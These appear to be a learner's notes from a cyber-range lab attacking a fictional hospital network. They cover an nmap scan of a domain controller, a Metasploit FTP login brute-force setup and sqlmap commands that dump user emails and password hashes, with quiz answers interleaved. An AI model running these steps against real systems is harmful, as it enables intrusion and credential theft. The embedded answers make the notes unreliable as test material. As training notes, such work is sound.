# offensive cyber range armsdon-h notes

## domain controller

```bash

Host is up (0.00056s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: xxxxxx)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds  Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: ARMSDON)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: ARMSDON
|   NetBIOS_Domain_Name: ARMSDON
|   NetBIOS_Computer_Name: EC2AMAZ-DFA8KLR
|   DNS_Domain_Name: armsdon.hospital.local
|   DNS_Computer_Name: EC2AMAZ-DFA8KLR.armsdon.hospital.local
|   Product_Version: 10.0.14393
|_  System_Time: 2022-08-13T22:47:37+00:00
| ssl-cert: Subject: commonName=EC2AMAZ-DFA8KLR.armsdon.hospital.local
| Not valid before: 2022-08-12T20:54:20
|_Not valid after:  2023-02-11T20:54:20
|_ssl-date: 2022-08-13T22:48:17+00:00; 0s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=8/13%Time=62F82983%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");                                                                                                                                               
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                     
Device type: general purpose                                                                                                                                              
Running (JUST GUESSING): Microsoft Windows 2016 (89%), FreeBSD 6.X (85%)                                                                                                  
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:freebsd:freebsd:6.2                                                                                                   
Aggressive OS guesses: Microsoft Windows Server 2016 (89%), FreeBSD 6.2-RELEASE (85%)                                                                                     
No exact OS matches for host (test conditions non-ideal).                                                                                                                 
Network Distance: 2 hops                                                                                                                                                  
Service Info: Host: EC2AMAZ-DFA8KLR; OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                           
                                                                                                                                                                          
Host script results:                                                                                                                                                      
|_clock-skew: mean: 0s, deviation: 2s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)
|   Computer name: EC2AMAZ-DFA8KLR
|   NetBIOS computer name: EC2AMAZ-DFA8KLR\x00
|   Domain name: armsdon.hospital.local
|   Forest name: armsdon.hospital.local
|   FQDN: EC2AMAZ-DFA8KLR.armsdon.hospital.local
|_  System time: xxxxxx
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: xxxxx
|_  start_date: xxxxx


```

> Once the hash of the domain administrator has been recovered, which of the following programs can be used to perform a Pass the Hash attack?

`pth-smbclient`

---

## ftp server

<https://pentestlab.blog/2012/03/01/attacking-the-ftp-service/>

```bash
mfsconsole

search ftp_login

use auxiliary/scanner/ftp/ftp_login

show options

set RHOST XXXXX

find / 2>/dev/null | grep -i wordlist | grep unix
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
/usr/share/metasploit-framework/data/wordlists/unix_users.txt

set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

```

> What type of attack that allows privilege escalation is the FTP server vulnerable to?

`DLL Hijacking`

---

## intranet

```bash
sqlmap exploit

sqlmap --help

sqlmap -u ${URL} --batch --banner

back-end DBMS is MySQL
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 5.0.12
banner: '10.1.44-MariaDB-0ubuntu0.18.04.1'

available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] qualitycare


sqlmap -u URL --batch --passwords

database management system users password hashes:
[*] root [1]:
    password hash: NULL


# time-base blind attach is SUPER SLOW, so narrowing it down to a single DB, possible table and better limit to coloumn as well
# sqlmap -u ${URL} --batch -D mysql --dump

# find available databases
sqlmap -u ${URL} --batch --dbs

# find the tables in the specific database
sqlmap -u ${URL} --batch -D mysql --tables    

# find the columns on the specific table, on the specific database
sqlmap -u ${URL} --batch -D mysql -T users --columns

# dump the selected values...
sqlmap -u ${URL} --batch -D mysql -T users -C email,password --dump


```
